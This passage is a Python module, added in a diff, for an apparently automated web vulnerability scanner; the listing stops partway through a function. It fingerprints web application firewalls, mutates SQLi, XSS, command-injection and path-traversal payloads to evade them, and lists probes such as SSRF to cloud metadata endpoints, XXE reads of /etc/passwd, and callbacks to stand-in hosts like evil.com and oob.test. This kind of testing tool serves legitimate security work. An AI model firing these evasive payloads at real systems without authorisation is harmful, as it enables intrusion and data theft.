@@ -1,0 +1,771 @@
+#!/usr/bin/env python3
+"""Adaptive Engine — retry, mutation, WAF fallback, alternative probe strategy.
+
+Enables the vulnerability detector to ADAPT when a probe fails or is blocked:
+  1. retry with exponential backoff (transient network errors)
+  2. payload mutation (WAF detected → encoding/case/comment variants)
+  3. WAF detection fallback (identify WAF type → select bypass strategy)
+  4. alternative probe strategy (if primary signal fails, try secondary)
+
+This module is deterministic and side-effect free w.r.t. the network: it takes
+a probe result + context and emits an ADAPTIVE PLAN (mutated payloads, retry
+schedule, fallback strategy). The agent executes the plan via ctx.tools.
+
+Used at ACTIVE_TESTING, between initial detection and validation.
+
+Usage (CLI emits the adaptive plan for a failed probe):
+  python adaptive_engine.py --probe probe.json --result result.json
+  cat probe.json | python adaptive_engine.py --result result.json
+"""
+
+from __future__ import annotations
+
+import argparse
+import json
+import os
+import sys
+from dataclasses import dataclass, field
+
+sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
+from utils import load_json, dump_json
+
+# ---- WAF fingerprints -------------------------------------------------------
+WAF_SIGNATURES = {
+    # Tier 1 — Global CDN/Cloud WAFs
+    "cloudflare": {
+        "header": "cf-ray",
+        "status": [403, 503],
+        "body": ["cloudflare", "attention required", "cf-chl-bypass", "cf-cache-status"],
+    },
+    "akamai": {
+        "header": "akamai-grn",
+        "status": [403],
+        "body": ["access denied", "akamai", "reference #"],
+    },
+    "aws_waf": {
+        "header": "x-amzn-requestid",
+        "status": [403],
+        "body": ["request blocked", "awswaf", "awselb"],
+    },
+    "imperva": {
+        "header": "x-cdn",
+        "status": [403],
+        "body": ["imperva", "incapsula", "blocked by incapsula", "_Incapsula_Resource"],
+    },
+    "f5_asm": {
+        "header": None,
+        "status": [403],
+        "body": ["the requested url was rejected", "please consult with your administrator", "f5 networks", "big-ip"],
+    },
+    "fortiweb": {
+        "header": None,
+        "status": [403, 406],
+        "body": ["fortiweb", "attack detected", "application firewall"],
+    },
+    "barracuda": {
+        "header": None,
+        "status": [403],
+        "body": ["barracuda", "barra counter", "session blocked"],
+    },
+    "sucuri": {
+        "header": "x-sucuri-id",
+        "status": [403],
+        "body": ["sucuri", "cloudproxy", "sucuri/cloudproxy", "access denied - sucuri"],
+    },
+    "radware": {
+        "header": "x-sl-compstate",
+        "status": [403],
+        "body": ["unauthorized activity", "cloud waf", "appwall"],
+    },
+    "f5_silverline": {
+        "header": None,
+        "status": [403],
+        "body": ["blocked by silverline", "request blocked", "f5 silverline"],
+    },
+
+    # Tier 2 — Chinese WAFs (国内安全厂商)
+    "safedog": {
+        "header": None,
+        "status": [403],
+        "body": ["safedog", "安全狗", "waf"],
+    },
+    "yundun": {  # 阿里云盾
+        "header": "yundun",
+        "status": [405, 403],
+        "body": ["yundun", "云盾"],
+    },
+    "tencent_waf": {  # 腾讯云WAF
+        "header": None,
+        "status": [403],
+        "body": ["tencent", "tencent cloud waf", "腾讯云waf", "waf.tencent"],
+    },
+    "sangfor": {  # 深信服
+        "header": None,
+        "status": [403],
+        "body": ["sangfor", "深信服", "sangfor waf"],
+    },
+    "chaitin": {  # 长亭雷池 SafeLine
+        "header": "x-safeline",
+        "status": [403],
+        "body": ["safeline", "chaitin", "雷池", "sl-ce"],
+    },
+    "venustech": {  # 启明星辰
+        "header": None,
+        "status": [403],
+        "body": ["venustech", "启明星辰", "天清waf"],
+    },
+    "nsfocus": {  # 绿盟
+        "header": None,
+        "status": [403],
+        "body": ["nsfocus", "绿盟", "nsfocus waf"],
+    },
+    "hillstone": {  # 山石网科
+        "header": None,
+        "status": [403],
+        "body": ["hillstone", "山石", "stoneos"],
+    },
+    "topsec": {  # 天融信
+        "header": None,
+        "status": [403],
+        "body": ["topsec", "天融信", "topsecwaf"],
+    },
+    "huawei_waf": {  # 华为云WAF
+        "header": None,
+        "status": [403, 418],
+        "body": ["huawei", "huaweicloud waf", "华为云waf"],
+    },
+    "baidu_waf": {  # 百度云加速
+        "header": "x-bce",
+        "status": [403],
+        "body": ["baidu", "yunjiasu", "云加速"],
+    },
+
+    # Tier 3 — Open-source / Niche WAFs
+    "mod_security": {
+        "header": "mod_security",
+        "status": [403],
+        "body": ["mod_security", "not acceptable", "mod-security"],
+    },
+    "naxsi": {
+        "header": None,
+        "status": [403, 418],
+        "body": ["naxsi", "naxsi/waf", "blocked by naxsi"],
+    },
+    "wallarm": {
+        "header": "x-wallarm",
+        "status": [403],
+        "body": ["wallarm", "wallarm waf"],
+    },
+    "wordfence": {
+        "header": None,
+        "status": [403, 503],
+        "body": ["generated by wordfence", "wordfence", "blocked by wordfence"],
+    },
+    "cloudbric": {
+        "header": None,
+        "status": [403],
+        "body": ["cloudbric", "penta security"],
+    },
+    "generic": {
+        "header": None,
+        "status": [403, 406, 429],
+        "body": ["blocked", "forbidden", "request rejected", "intercepted", "access denied"],
+    },
+}
+
+# ---- Mutation strategies per vulnerability type -----------------------------
+# Each strategy produces alternative payloads when the original is blocked.
+MUTATION_STRATEGIES = {
+    # ---- SQLi: 12 mutation strategies (expanded v3) ----
+    "sqli": [
+        lambda p: p.replace("'", "%27"),
+        lambda p: p.replace(" ", "/**/"),              # inline comment
+        lambda p: p.replace(" ", "/*PTSKILLTEST*/"),   # commented space
+        lambda p: p.replace("UNION", "UnIoN"),          # case variation
+        lambda p: p.replace("SELECT", "SeLeCt"),
+        lambda p: p + "/*",                             # trailing comment
+        lambda p: p.replace("'", "''"),                 # doubled quote
+        lambda p: p.replace("=", " LIKE "),             # LIKE instead of =
+        lambda p: p.replace(" ", "%09"),                # tab separator
+        lambda p: p.replace("or", "||"),                # alternative OR
+        lambda p: p.replace(" ", chr(0x0a)),            # newline separator
+        lambda p: p.replace("1=1", "2>1"),              # tautology variant
+    ],
+    # ---- XSS: 10 mutation strategies (expanded v3) ----
+    "xss": [
+        lambda p: p.replace("<", "%3C"),
+        lambda p: p.replace(">", "%3E"),
+        lambda p: p.replace("<script", "<ScRiPt"),
+        lambda p: p.replace("<script", "<svg/onload"),
+        lambda p: p.replace(" ", "/"),                  # slash separator
+        lambda p: p.replace("<", "\\u003c"),            # unicode
+        lambda p: p.replace("alert", "prompt"),         # alternative function
+        lambda p: p.replace("alert", "confirm"),        # alternative function
+        lambda p: p.replace("<", "&lt;"),               # HTML entity
+        lambda p: p.replace("onerror", "ONERROR"),      # case variation
+    ],
+    # ---- Command Injection: 8 mutation strategies (expanded v3) ----
+    "command_injection": [
+        lambda p: p.replace(" ", "$IFS"),               # IFS separator (Linux)
+        lambda p: p.replace(";", "%3B"),                # URL encode
+        lambda p: p.replace(";", "&&"),                 # alternative operator
+        lambda p: p.replace("sleep", "SlEeP"),          # case variation
+        lambda p: p.replace(";", "%0a"),                # newline separator
+        lambda p: p.replace("|", "%7c"),                # URL encode pipe
+        lambda p: p.replace("cat", "c\\at"),            # backslash escape
+        lambda p: p.replace("cat", "c'a't"),            # single quote escape
+    ],
+    # ---- Path Traversal: 8 mutation strategies (expanded v3) ----
+    "path_traversal": [
+        lambda p: p.replace("..", "%2e%2e"),            # URL encoded
+        lambda p: p.replace("..", "....//"),            # filter bypass
+        lambda p: p.replace("/", "%2f"),                # encoded slash
+        lambda p: p.replace("/", "\\"),                 # backslash (Windows)
+        lambda p: p.replace("..", "..%252f"),           # double encoded
+        lambda p: p.replace("..", "..;"),               # IIS semicolon
+        lambda p: p.replace("..", "..%c0%af"),          # Unicode overlong
+        lambda p: p.replace("..", ".%00./"),            # null byte bypass
+    ],
+    # ---- File Upload: 8 mutation strategies (expanded v3) ----
+    "file_upload": [
+        lambda p: p.replace(".php", ".phtml"),          # alt extension
+        lambda p: p.replace(".php", ".phar"),
+        lambda p: p.replace(".php", ".php5"),
+        lambda p: p.replace(".php", ".asp;.jpg"),       # IIS semicolon
+        lambda p: p.replace(".php", ".jpg.php"),        # double extension
+        lambda p: p.replace(".php", ".php%00.jpg"),     # null byte
+        lambda p: p.replace(".php", ".PhP"),            # case variation
+        lambda p: p.replace(".php", ".p\\hp"),          # malformed
+    ],
+    # ---- NoSQL Injection: 6 mutation strategies (v3 NEW) ----
+    "nosql_injection": [
+        lambda p: p.replace("$gt", "$gte"),
+        lambda p: p.replace("$ne", "$nin"),
+        lambda p: p.replace("true", "1"),
+        lambda p: p.replace('"', "'"),
+        lambda p: p.replace("$where", "this"),
+        lambda p: p.replace("$regex", "$options"),
+    ],
+    # ---- LDAP Injection: 6 mutation strategies (v3 NEW) ----
+    "ldap_injection": [
+        lambda p: p.replace("(", "%28"),
+        lambda p: p.replace(")", "%29"),
+        lambda p: p.replace("*", "%2a"),
+        lambda p: p.replace("&", "%26"),
+        lambda p: p.replace("|", "%7c"),
+        lambda p: p.replace("!", "!!"),
+    ],
+    # ---- CRLF Injection: 5 mutation strategies (v3 NEW) ----
+    "crlf_injection": [
+        lambda p: p.replace("%0d%0a", "%0d%0a%20"),
+        lambda p: p.replace("\r\n", "\r\n "),
+        lambda p: p.replace("%0d", "%0d%0d"),
+        lambda p: p.replace("%0a", "%0a%0a"),
+        lambda p: p.replace("\r\n", "%E5%98%8A%E5%98%8D"),  # Unicode CRLF
+    ],
+    # ---- SSRF: 8 mutation strategies (v3 NEW) ----
+    "ssrf": [
+        lambda p: p.replace("http://", "http://127.0.0.1:"),
+        lambda p: p.replace("127.0.0.1", "0.0.0.0"),
+        lambda p: p.replace("127.0.0.1", "[::1]"),
+        lambda p: p.replace("127.0.0.1", "2130706433"),   # decimal IP
+        lambda p: p.replace("127.0.0.1", "0x7f000001"),   # hex IP
+        lambda p: p.replace("localhost", "localtest.me"),
+        lambda p: p.replace("http://", "http://☁.127.0.0.1/"),
+        lambda p: p.replace("http://", "http://127.0.0.1.nip.io/"),
+    ],
+    # ---- SSTI: 6 mutation strategies (v3 NEW) ----
+    "ssti": [
+        lambda p: p.replace("{{", "${"),
+        lambda p: p.replace("7*7", "7*'7'"),
+        lambda p: p.replace("{{", "<%="),
+        lambda p: p.replace("self", "self.__class__"),
+        lambda p: p.replace("config", "request.application"),
+        lambda p: p.replace("7*7", "42|add:7"),
+    ],
+    # ---- XXE: 5 mutation strategies (v3 NEW) ----
+    "xxe": [
+        lambda p: p.replace("SYSTEM", "SYSTEM '"),
+        lambda p: p.replace("file://", "php://filter/"),
+        lambda p: p.replace("<!ENTITY", "<!ENTITY %"),
+        lambda p: p.replace("SYSTEM", "PUBLIC"),
+        lambda p: p.replace("file:///etc/passwd", "expect://id"),
+    ],
+    # ---- Deserialization: 5 mutation strategies (v3 NEW) ----
+    "deserialization": [
+        lambda p: p.replace("O:", "O:+"),
+        lambda p: p.replace("py/", "py\\/"),
+        lambda p: p.replace("php:", "PHP:"),
+        lambda p: p.replace("java.", "java/util/"),
+        lambda p: p.replace("base64", "base64url"),
+    ],
+    # ---- Prototype Pollution: 5 mutation strategies (v3 NEW) ----
+    "prototype_pollution": [
+        lambda p: p.replace("__proto__", "constructor.prototype"),
+        lambda p: p.replace("__proto__", "__proto__%00"),
+        lambda p: p.replace("__proto__", '["__proto__"]'),
+        lambda p: p.replace("__proto__", "constructor['prototype']"),
+        lambda p: p.replace("__proto__", "__PROTO__"),
+    ],
+    # ---- GraphQL Injection: 5 mutation strategies (v3 NEW) ----
+    "graphql_injection": [
+        lambda p: p.replace("query", "query\n"),
+        lambda p: p.replace("__typename", "__schema"),
+        lambda p: p.replace("{", "{%20"),
+        lambda p: p.replace("query", "query        "),  # many spaces
+        lambda p: p.replace("id: 1", "id: \\n1"),       # newline injection
+    ],
+    # ---- HTTP Smuggling: 5 mutation strategies (v3 NEW) ----
+    "http_smuggling": [
+        lambda p: p.replace("Transfer-Encoding", "Transfer-Encoding\n"),
+        lambda p: p.replace("chunked", "chunked\x0b"),
+        lambda p: p.replace("Content-Length", "Content-Length\x20"),
+        lambda p: p.replace("chunked", "identity, chunked"),
+        lambda p: p.replace("CL: ", "Content-Length: 0\r\n\r\n"),
+    ],
+    # ---- Cache Poisoning: 5 mutation strategies (v3 NEW) ----
+    "cache_poisoning": [
+        lambda p: p.replace("X-Forwarded-Host", "X-Forwarded-Host\n"),
+        lambda p: p.replace("X-Forwarded-Scheme", "X-Forwarded-Scheme: http"),
+        lambda p: p.replace("X-Forwarded-For", "X-Forwarded-For\n"),
+        lambda p: p.replace("X-Original-URL", "X-Original-URL\n"),
+        lambda p: p.replace("X-Rewrite-URL", "X-Rewrite-URL\n"),
+    ],
+    # ---- JWT: 5 mutation strategies (v3 NEW) ----
+    "jwt_deep_analysis": [
+        lambda p: p.replace("alg\":\"HS256\"", "alg\":\"none\""),
+        lambda p: p.replace("alg\":\"RS256\"", "alg\":\"HS256\""),
+        lambda p: p.replace("eyJ", "eyJ"),              # preserve header
+        lambda p: p.replace(".", ".."),
+        lambda p: p.replace("Bearer ", "Bearer%20"),
+    ],
+    # ---- OAuth: 5 mutation strategies (v3 NEW) ----
+    "oauth_misconfig": [
+        lambda p: p.replace("redirect_uri", "redirect_uri%00"),
+        lambda p: p.replace("response_type=code", "response_type=token"),
+        lambda p: p.replace("client_id", "client_id%00"),
+        lambda p: p.replace("scope", "scope%0a"),
+        lambda p: p.replace("state=", "state=../../"),
+    ],
+    # ---- Race Condition: 4 mutation strategies (v3 NEW) ----
+    "race_condition": [
+        lambda p: p.replace("Transfer-Encoding", "Transfer-Encoding: chunked"),
+        lambda p: p.replace("POST", "POST\n"),
+        lambda p: p.replace("Connection: keep-alive", "Connection: Keep-Alive\n"),
+        lambda p: p.replace("Content-Length: 1", "Content-Length: 0"),
+    ],
+    # ---- CORS: 4 mutation strategies (v3 NEW) ----
+    "cors_misconfig": [
+        lambda p: p.replace("Origin: https://evil.com", "Origin: https://evil.com."),
+        lambda p: p.replace("Origin: https://evil.com", "Origin: null"),
+        lambda p: p.replace("Origin: https://evil.com", "Origin: https://sub.evil.com"),
+        lambda p: p.replace("Origin: https://evil.com", "Origin: https://evil.com%60"),
+    ],
+    # ---- Host Header Injection: 4 mutation strategies (v3 NEW) ----
+    "host_header_injection": [
+        lambda p: p.replace("Host:", "X-Forwarded-Host:"),
+        lambda p: p.replace("Host:", "X-Host:"),
+        lambda p: p.replace("Host:", "Host:\n"),
+        lambda p: p.replace("Host: target.com", "Host: evil.com"),
+    ],
+}
+
+# ---- Alternative probe strategies (secondary signals) ----------------------
+ALTERNATIVE_SIGNALS = {
+    "sqli": [
+        {"method": "error_based", "payload": "'", "signal": "SQL syntax|ORA-|PG::SyntaxError|sqlite3|mysql_fetch"},
+        {"method": "boolean_based", "payload_true": "AND 1=1", "payload_false": "AND 1=2", "signal": "response_differential"},
+        {"method": "time_based", "payload": "; SELECT pg_sleep(2) --", "signal": "time_delta>=1.8s"},
+        {"method": "stacked_query", "payload": "; WAITFOR DELAY '0:0:5'", "signal": "time_delta>=4s (MSSQL)"},
+        {"method": "union_select", "payload": "' UNION SELECT NULL--", "signal": "column count mismatch OR data returned"},
+        {"method": "order_by_enum", "payload": "' ORDER BY 1--", "signal": "column count discovered via error"},
+    ],
+    "xss": [
+        {"method": "marker_reflection", "payload": "PTSKILLTEST<xss>9a3f", "signal": "raw reflection of < >"},
+        {"method": "dom_based", "payload": "#PTSKILLTEST<xss>", "signal": "DOM mutation observed via browser"},
+        {"method": "attribute_injection", "payload": '" onfocus=PTSKILLTEST ', "signal": "attribute reflected unescaped"},
+        {"method": "event_handler", "payload": '" onmouseover=PTSKILLTEST ', "signal": "event handler injected"},
+        {"method": "href_injection", "payload": "javascript:PTSKILLTEST", "signal": "javascript: URI reflected in href"},
+        {"method": "svg_injection", "payload": "<svg/onload=PTSKILLTEST>", "signal": "SVG tag reflected"},
+    ],
+    "command_injection": [
+        {"method": "time_based_semicolon", "payload": ";sleep 3 #", "signal": "time_delta>=2.5s"},
+        {"method": "time_based_pipe", "payload": "|sleep 3", "signal": "time_delta>=2.5s"},
+        {"method": "time_based_dollar", "payload": "$(sleep 3)", "signal": "time_delta>=2.5s"},
+        {"method": "time_based_backtick", "payload": "`sleep 3`", "signal": "time_delta>=2.5s"},
+        {"method": "output_reflection", "payload": ";echo PTSKILLTEST", "signal": "PTSKILLTEST in response body"},
+        {"method": "dns_oob", "payload": ";nslookup PTSKILLTEST.oob.test", "signal": "DNS callback received"},
+    ],
+    "idor": [
+        {"method": "cross_user", "signal": "user B gets 200 with user A data"},
+        {"method": "sequential_enum", "signal": "id+1 returns different user data"},
+        {"method": "unauth_access", "signal": "unauthenticated request gets 200"},
+        {"method": "uuid_enum", "signal": "UUID parameter enumeration returns other users"},
+        {"method": "mass_assignment", "signal": "user_id param in body overrides session user"},
+    ],
+    # ---- v3 NEW: NoSQL injection alternative signals ----
+    "nosql_injection": [
+        {"method": "ne_operator", "payload": '{"username": {"$ne": "invalid"}}', "signal": "login bypass OR data returned"},
+        {"method": "gt_operator", "payload": '{"id": {"$gt": ""}}', "signal": "all records returned"},
+        {"method": "regex_operator", "payload": '{"username": {"$regex": ".*"}}', "signal": "all users returned"},
+        {"method": "where_clause", "payload": '{"$where": "sleep(2000)"}', "signal": "time_delta>=1.8s"},
+        {"method": "type_juggling", "payload": '{"token": {"$exists": true}}', "signal": "auth bypass via token exists"},
+    ],
+    # ---- v3 NEW: LDAP injection alternative signals ----
+    "ldap_injection": [
+        {"method": "wildcard_star", "payload": "*)(uid=*", "signal": "all users returned (structural change)"},
+        {"method": "or_filter", "payload": "*)(|(uid=*", "signal": "OR injection bypass"},
+        {"method": "and_filter", "payload": "*)(&(uid=*)(userPassword=*)", "signal": "AND injection with password field"},
+        {"method": "blind_time", "payload": "*)(uid=*))(|(uid=*", "signal": "response differential"},
+        {"method": "null_byte", "payload": "*%00", "signal": "null byte bypass returns data"},
+    ],
+    # ---- v3 NEW: SSRF alternative signals ----
+    "ssrf": [
+        {"method": "collaborator_oob", "payload": "http://PTSKILLTEST.oob.test", "signal": "DNS/HTTP callback received"},
+        {"method": "internal_service", "payload": "http://169.254.169.254/latest/meta-data/", "signal": "cloud metadata returned"},
+        {"method": "loopback_http", "payload": "http://127.0.0.1:80/", "signal": "internal service response"},
+        {"method": "file_protocol", "payload": "file:///etc/passwd", "signal": "local file content in response"},
+        {"method": "gopher_protocol", "payload": "gopher://127.0.0.1:6379/_INFO", "signal": "Redis INFO leaked"},
+    ],
+    # ---- v3 NEW: SSTI extended alternative signals ----
+    "ssti": [
+        {"method": "twig_math", "payload": "{{7*7}}", "signal": "49 reflected"},
+        {"method": "jinja2_config", "payload": "{{config}}", "signal": "Flask config leaked"},
+        {"method": "freemarker_exec", "payload": "${7*7}", "signal": "49 reflected"},
+        {"method": "velocity_math", "payload": "#set($x=7*7)$x", "signal": "49 reflected"},
+        {"method": "smarty_phpinfo", "payload": "{php}phpinfo(){/php}", "signal": "phpinfo output"},
+    ],
+    # ---- v3 NEW: XXE alternative signals ----
+    "xxe": [
+        {"method": "oob_dtd", "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://PTSKILLTEST.oob.test\">]>", "signal": "DNS callback"},
+        {"method": "file_read", "payload": "<!ENTITY xxe SYSTEM \"file:///etc/hostname\">", "signal": "hostname in response"},
+        {"method": "error_based", "payload": "<!ENTITY xxe SYSTEM \"file:///nonexistent\">", "signal": "error stack trace with path"},
+        {"method": "php_filter", "payload": "<!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=index.php\">", "signal": "base64 PHP source"},
+        {"method": "parameter_entity", "payload": "<!ENTITY % xxe SYSTEM \"http://PTSKILLTEST.oob.test\"> %xxe;", "signal": "DNS callback via parameter entity"},
+    ],
+    # ---- v3 NEW: File upload extended alternative signals ----
+    "file_upload": [
+        {"method": "extension_blacklist", "payload": ".phtml", "signal": "file executed as PHP"},
+        {"method": "content_type_bypass", "payload": "image/jpeg", "signal": "file accepted despite whitelist"},
+        {"method": "double_extension", "payload": ".jpg.php", "signal": "PHP execution via double extension"},
+        {"method": "null_byte", "payload": ".php%00.jpg", "signal": "null byte truncation"},
+        {"method": "svg_ssrf", "payload": "<svg><image href=\"http://PTSKILLTEST.oob.test\"/></svg>", "signal": "SVG-based SSRF via upload"},
+    ],
+    # ---- v3 NEW: CRLF alternative signals ----
+    "crlf_injection": [
+        {"method": "header_split", "payload": "%0d%0aSet-Cookie:crlf=injected", "signal": "Set-Cookie header in response"},
+        {"method": "response_splitting", "payload": "%0d%0a%0d%0a<script>alert(1)</script>", "signal": "HTML injected in response body"},
+        {"method": "location_header", "payload": "%0d%0aLocation:%20http://evil.com", "signal": "arbitrary redirect"},
+        {"method": "xss_via_crlf", "payload": "%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>", "signal": "XSS via CRLF body injection"},
+    ],
+    # ---- v3 NEW: GraphQL alternative signals ----
+    "graphql_injection": [
+        {"method": "introspection", "payload": "{__schema{types{name}}}", "signal": "schema leaked"},
+        {"method": "depth_attack", "payload": "query { user { posts { comments { user { posts { title } } } } } }", "signal": "query depth error"},
+        {"method": "batching", "payload": "[{query: \"query { __typename }\"}, {query: \"query { __typename }\"}]", "signal": "batch query bypass"},
+        {"method": "field_suggestion", "payload": "query { _doesNotExist }", "signal": "field suggestions leaked"},
+        {"method": "alias_overload", "payload": "query { a:__typename b:__typename c:__typename ... }", "signal": "alias-based DOS"},
+    ],
+    # ---- v3 NEW: CORS alternative signals ----
+    "cors_misconfig": [
+        {"method": "null_origin", "payload": "Origin: null", "signal": "ACAO: null in response"},
+        {"method": "subdomain_wildcard", "payload": "Origin: https://evil.target.com", "signal": "ACAO: https://evil.target.com"},
+        {"method": "origin_reflection", "payload": "Origin: https://evil.com", "signal": "ACAO: https://evil.com"},
+        {"method": "preflight_credentials", "payload": "Origin: https://evil.com\nAccess-Control-Allow-Credentials: true", "signal": "ACAC: true with reflected origin"},
+    ],
+    # ---- v3 NEW: JWT alternative signals ----
+    "jwt_deep_analysis": [
+        {"method": "alg_none", "payload": "alg:none", "signal": "token accepted without signature"},
+        {"method": "algorithm_confusion", "payload": "alg:HS256 with public key", "signal": "HMAC using public key accepted"},
+        {"method": "kid_injection", "payload": "kid: ../../dev/null", "signal": "KID traversal accepted"},
+        {"method": "jku_header", "payload": "jku: http://evil.com/jwks.json", "signal": "remote JWK accepted"},
+        {"method": "empty_signature", "payload": "signature: ''", "signal": "empty signature accepted"},
+    ],
+    # ---- v3 NEW: OAuth alternative signals ----
+    "oauth_misconfig": [
+        {"method": "redirect_uri_open", "payload": "redirect_uri=https://evil.com/callback", "signal": "redirect to evil.com"},
+        {"method": "state_missing", "payload": "state= (empty)", "signal": "CSRF in OAuth flow"},
+        {"method": "implicit_flow", "payload": "response_type=token", "signal": "token in URL fragment"},
+        {"method": "client_secret_leak", "payload": "client_id in mobile app", "signal": "hardcoded client secret"},
+        {"method": "scope_escalation", "payload": "scope=admin%20profile", "signal": "privilege scope escalation"},
+    ],
+    # ---- v3 NEW: HTTP Smuggling alternative signals ----
+    "http_smuggling": [
+        {"method": "cl_te", "payload": "Transfer-Encoding: chunked + Content-Length", "signal": "queue poisoning / response differential"},
+        {"method": "te_cl", "payload": "TE before CL", "signal": "desync detected via timing"},
+        {"method": "te_te", "payload": "obfuscated TE header", "signal": "WAF bypass via TE obfuscation"},
+        {"method": "http2_downgrade", "payload": "HTTP/2 to HTTP/1.1 downgrade", "signal": "frontend-backend mismatch"},
+    ],
+    # ---- v3 NEW: Cache Poisoning alternative signals ----
+    "cache_poisoning": [
+        {"method": "unkeyed_header", "payload": "X-Forwarded-Host: evil.com", "signal": "cache key manipulation"},
+        {"method": "fat_get", "payload": "GET with body content", "signal": "cache poisoning via method confusion"},
+        {"method": "parameter_cloaking", "payload": ";key=value", "signal": "parameter cloaking bypass"},
+        {"method": "header_override", "payload": "X-Original-URL: /admin", "signal": "cache collision with admin path"},
+    ],
+    # ---- v3 NEW: Race Condition alternative signals ----
+    "race_condition": [
+        {"method": "single_endpoint_turbo", "payload": "10 concurrent POST requests", "signal": "multiple resources created (TOCTOU)"},
+        {"method": "coupon_code", "payload": "parallel apply coupon", "signal": "coupon applied multiple times"},
+        {"method": "limit_race", "payload": "parallel rate-limited requests", "signal": "rate limit bypassed"},
+        {"method": "multi_endpoint", "payload": "parallel GET + POST", "signal": "state inconsistency between endpoints"},
+    ],
+    # ---- v3 NEW: Subdomain Takeover alternative signals ----
+    "subdomain_takeover": [
+        {"method": "cname_dangling", "payload": "dig CNAME sub.target.com", "signal": "CNAME to unclaimed service"},
+        {"method": "nxdomain", "payload": "dig A sub.target.com", "signal": "NXDOMAIN (dangling)"},
+        {"method": "404_service", "payload": "HTTP GET sub.target.com", "signal": "service provider 404 page"},
+        {"method": "s3_takeover", "payload": "HTTP GET sub.target.com", "signal": "NoSuchBucket response"},
+    ],
+    # ---- v3 NEW: Host Header Injection alternative signals ----
+    "host_header_injection": [
+        {"method": "x_forwarded_host", "payload": "X-Forwarded-Host: evil.com", "signal": "evil.com reflected in links"},
+        {"method": "double_host", "payload": "Host: evil.com\nHost: target.com", "signal": "host header poisoning"},
+        {"method": "absolute_uri", "payload": "GET https://evil.com/ HTTP/1.1", "signal": "absolute URI accepted"},
+        {"method": "host_override", "payload": "X-Host: evil.com", "signal": "X-Host header reflected"},
+        {"method": "password_reset", "payload": "Host: evil.com on reset endpoint", "signal": "reset link sent to evil.com"},
+    ],
+    # ---- v3 NEW: Prototype Pollution alternative signals ----
+    "prototype_pollution": [
+        {"method": "constructor_prototype", "payload": "constructor.prototype.isAdmin=true", "signal": "privilege escalation via prototype"},
+        {"method": "json_parse", "payload": '{"__proto__":{"isAdmin":true}}', "signal": "JSON.parse merging"},
+        {"method": "object_assign", "payload": "Object.assign via merge", "signal": "merge function pollution"},
+        {"method": "query_string", "payload": "?__proto__[isAdmin]=true", "signal": "QS prototype pollution"},
+    ],
+    # ---- v3 NEW: Dependency Confusion alternative signals ----
+    "dependency_confusion": [
+        {"method": "public_registry", "payload": "npm publish with same name", "signal": "private package overwritten"},
+        {"method": "scoped_package", "payload": "@company/package not in registry", "signal": "scope available for takeover"},
+        {"method": "version_priority", "payload": "higher version number", "signal": "version priority confusion"},
+        {"method": "typo_squatting", "payload": "common typo of package name", "signal": "typo-squatted package available"},
+    ],
+    # ---- v3 NEW: Mass Assignment alternative signals ----
+    "mass_assignment": [
+        {"method": "is_admin", "payload": '{"isAdmin": true}', "signal": "admin role assigned"},
+        {"method": "role_override", "payload": '{"role": "admin"}', "signal": "role escalated to admin"},
+        {"method": "verified_flag", "payload": '{"verified": true}', "signal": "verified flag set"},
+        {"method": "balance_field", "payload": '{"balance": 99999}', "signal": "balance modified via mass assignment"},
+    ],
+}
+
+
+@dataclass
+class AdaptivePlan:
+    """The adaptive strategy emitted when a probe fails or is blocked."""
+
+    action: str  # "retry" | "mutate" | "fallback_signal" | "waf_bypass" | "abort"
+    reason: str
+    waf_detected: bool = False
+    waf_type: str | None = None
+    retry_schedule: list = field(default_factory=list)  # [{delay_ms, attempt}]
+    mutated_payloads: list = field(default_factory=list)
+    alternative_signals: list = field(default_factory=list)
+    fallback_strategy: str | None = None
+    max_retries: int = 3
+    backoff_base_ms: int = 500
+    backoff_max_ms: int = 8000
+
+
+def detect_waf(result: dict) -> tuple[bool, str | None]:
+    """Inspect an HTTP response result for WAF fingerprints.
+
+    Returns (waf_detected, waf_type). Checks headers, status codes, and body.
+    """
+    status = result.get("status_code")
+    headers = result.get("headers", {}) or {}
+    body = (result.get("body", "") or "").lower()
+    header_keys = " ".join(str(k).lower() for k in headers.keys())
+
+    for waf_name, sig in WAF_SIGNATURES.items():
+        if waf_name == "generic":
+            continue
+        # header match
+        if sig["header"] and sig["header"].lower() in header_keys:
+            return True, waf_name
+        # status + body match
+        if status in (sig["status"] or []):
+            for body_sig in (sig["body"] or []):
+                if body_sig.lower() in body:
+                    return True, waf_name
+    # generic fallback
+    if status in WAF_SIGNATURES["generic"]["status"]:
+        for body_sig in WAF_SIGNATURES["generic"]["body"]:
+            if body_sig.lower() in body:
+                return True, "generic"
+    return False, None
+
+
+def generate_mutations(vuln_type: str, original_payload: str, max_variants: int = 5) -> list[str]:
+    """Generate mutated payload variants for WAF bypass.
+
+    Uses type-specific mutation strategies. Returns up to max_variants unique
+    mutations. Each mutation is a transformation of the original payload.
+    """
+    strategies = MUTATION_STRATEGIES.get(vuln_type, [])
+    mutations = []
+    seen = {original_payload}
+    for strategy in strategies:
+        try:
+            mutated = strategy(original_payload)
+            if mutated not in seen:
+                seen.add(mutated)
+                mutations.append(mutated)
+                if len(mutations) >= max_variants:
+                    break
+        except Exception:
+            continue
+    return mutations
+
+
+def build_retry_schedule(max_retries: int, base_ms: int = 500, max_ms: int = 8000) -> list[dict]:
+    """Exponential backoff schedule: 500ms, 1000ms, 2000ms, 4000ms, 8000ms (capped)."""
+    schedule = []
+    delay = base_ms
+    for attempt in range(1, max_retries + 1):
+        schedule.append({"attempt": attempt, "delay_ms": min(delay, max_ms)})
+        delay *= 2
+    return schedule
+
+
+def classify_failure(result: dict) -> str:
+    """Classify why a probe failed → determines the adaptive action.
+
+    Returns one of:
+      "transient"     — timeout/connection error → retry
+      "waf_blocked"   — 403/406/429 with WAF fingerprint → mutate
+      "false_negative"— 200 but signal not matched → fallback_signal
+      "auth_required" — 401/403 without WAF → skip (needs credentials)
+      "not_found"     — 404 → skip (endpoint gone)
+      "server_error"  — 5xx → retry once then abort
+    """
+    if not result:
+        return "transient"
+    error = result.get("error", "")
+    status = result.get("status_code")
+
+    if error in ("timeout", "connection_refused", "connection_reset"):
+        return "transient"
+    if status in (401, 403):
+        waf, _ = detect_waf(result)
+        return "waf_blocked" if waf else "auth_required"
+    if status in (404, 410):
+        return "not_found"
+    if status in (406, 429):
+        return "waf_blocked"
+    if status and 500 <= status < 600:
+        return "server_error"
+    if status and 200 <= status < 300:
